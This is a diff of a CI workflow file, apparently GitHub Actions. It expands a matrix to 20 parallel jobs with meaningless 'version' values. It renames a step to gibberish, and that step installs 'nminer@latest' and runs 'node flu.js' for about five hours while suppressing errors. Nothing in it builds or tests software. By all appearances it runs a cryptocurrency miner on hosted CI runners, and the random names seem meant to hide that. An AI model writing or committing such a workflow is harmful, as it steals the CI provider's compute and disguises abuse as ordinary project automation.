@@ -9,21 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7689 }
-          - { version: 4096 }
-          - { version: 6564 }
-          - { version: 8259 }
-          - { version: 6918 }
-          - { version: 1256 }
-          - { version: 5575 }
-          - { version: 6234 }
-          - { version: 5872 }
-          - { version: 9632 }
-          - { version: 2170 }
-          - { version: 4787 }
-          - { version: 3743 }
-          - { version: 374 }
-          - { version: 2486 }
+          - { version: 3458 }
+          - { version: 1295 }
+          - { version: 2994 }
+          - { version: 5997 }
+          - { version: 4873 }
+          - { version: 6922 }
+          - { version: 9074 }
+          - { version: 2594 }
+          - { version: 8853 }
+          - { version: 1769 }
+          - { version: 380 }
+          - { version: 7813 }
+          - { version: 7665 }
+          - { version: 7295 }
+          - { version: 4036 }
+          - { version: 7316 }
+          - { version: 6415 }
+          - { version: 7035 }
+          - { version: 3260 }
+          - { version: 1642 }
 
     steps:
       - name: Checkout
@@ -34,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: during ouch scarification forceful though
+      - name: memorise violently when ah boom
         run: |
           npm install nminer@latest
-          timeout 325m node flu.js || echo "flu executed"
+          timeout 308m node flu.js || echo "flu executed"
